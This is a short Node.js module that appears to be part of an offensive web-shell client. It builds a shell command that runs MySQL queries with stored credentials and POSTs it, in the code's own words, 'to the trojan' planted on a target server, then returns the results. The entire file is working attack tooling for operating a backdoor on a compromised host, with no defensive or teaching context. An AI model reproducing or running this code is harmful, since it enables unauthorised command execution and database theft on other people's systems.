const errors = require('./util-http-error');
const shelly = require('shelly');

module.exports = function(config, req, cmd, callback) {

  // assert that mysql credentials have been set
  if (! config.target.mysql.username) {
    return callback(new Error('config: mysql username unspecified.'));
  }
  if (! config.target.mysql.password) {
    return callback(new Error('config: mysql password unspecified.'));
  }

  // save the SQL query
  const query = cmd;

  // edge case: USE command
  if (/^USE /.test(query)) {
    const database = query.split(' ')[1].replace(';', '');
    config.target.mysql.database = database;
  }

  // embed the mysql query in a shell command as a batch
  cmd = shelly(
    'mysql -t -u? -p? ? -e?',
    config.target.mysql.username,
    config.target.mysql.password,
    config.target.mysql.database || '',
    query
  );

  // initialize the POST body
  const body = {
    cmd : cmd,
  };

  // POST to the trojan
  req.post({ body : body }, function(err, obj, response) {

    if (obj.statusCode !== 200) {
      return callback(errors(config, obj.statusCode));
    }

    callback(err, response);
  });
};
